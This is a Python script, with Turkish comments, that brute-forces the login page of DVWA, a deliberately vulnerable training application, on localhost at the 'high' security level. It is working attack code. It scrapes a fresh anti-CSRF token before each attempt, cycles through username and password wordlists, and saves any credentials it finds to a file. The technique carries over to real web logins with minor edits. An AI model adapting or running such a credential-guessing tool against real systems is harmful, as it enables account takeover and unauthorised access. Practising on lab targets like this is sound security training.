import os,sys,requests
from sys import argv
from bs4 import BeautifulSoup as Soup

target = "http://127.0.0.1/DVWA/vulnerabilities/brute/index.php"
sec_level = 'high'
session_id = '---' #you need to PHPSESSID, you can get this code with burp suite 
unsuccess = "Username and/or password incorrect."

Cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

def getCsrfToken():
    r = requests.get(target,cookies=Cookie,allow_redirects=False)
    soup = Soup(r.text,"html.parser")
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    return user_token

#Arguman kontrolu
if len(sys.argv) != 3:
        sys.stderr.write('\033[1;41mKullanim sekli :\033[1;m ' +'\033[1;37m'+ sys.argv[0]+'\033[1;m'+ '   \033[1;35mKullaniciAdi_Listesi \033[1;m   \033[1;33mSifre_Listesi\033[1;m\n')
        sys.exit(1)

scripts, userlist, passwordlist = argv

if not os.path.exists(userlist):
        sys.stderr.write('KullaniciAdi_Listesi bulunamadi!\n')
        sys.exit(1)

if not os.path.exists(passwordlist):
        sys.stderr.write('Sifre_Listesi bulunamadi!\n')
        sys.exit(1)


def url_request(username,password,user_token):
    data = {
        "username":username,
        "password":password,
        "user_token":user_token,
        "Login":"Login"
        }
    r = requests.get(target, params=data, cookies=Cookie,allow_redirects=False)
    return r.text



#Brute Force dongusu
def brute_force():
    print ("\n\n\033[1;32mListeler okunuyor...\033[1;m")
#Kullanici listesi okuma ve yukleme
    userfile = open(userlist, "r")
    usernames = userfile.read().split("\n")
    userfile.close()

#Sifre listesi okuma ve yukleme
    passfile = open(passwordlist, "r")
    passwords = passfile.read().split("\n")
    passfile.close()
    
    print("\n\033[1;41mStarting Brute Force Attack for DVWA High Security - Written by Caner..\033[1;m\n")
# Sayac
    sayac = 0

    # Denemeler
    for username in usernames:
        for password in passwords:

            # Sayac arttir
            sayac += 1

            # Kullanici bilgilendirme
            print ("\033[1;34m*%s\033[1;m: \033[1;35mKullanici_Adi:\033[1;m \033[1;33m%s\033[1;m - \033[1;35mSifre:\033[1;m \033[1;33m%s\033[1;m" % (sayac, username, password))

            # CSRF Token alma fonksiyonu
            user_token = getCsrfToken()

            # istek gonder
            attempt = url_request(username, password, user_token)

            # istek kontrolu
            if unsuccess not in attempt:
                print ("\n\n\033[1;31m*** Sifre bulundu! ***\033[1;m")
                print ("-- \033[1;35mKullanici Adi:\033[1;m \033[1;41m%s\033[1;m" % (username))
                print ("-- \033[1;35mSifre        :\033[1;m \033[1;41m%s\033[1;m" % (password))
                pas = open('done.txt','a')
                pas.write('%s : %s \n' %(username,password))
                pas.close()
                return True
    return False

#baslatma fonksiyonu
brute_force()
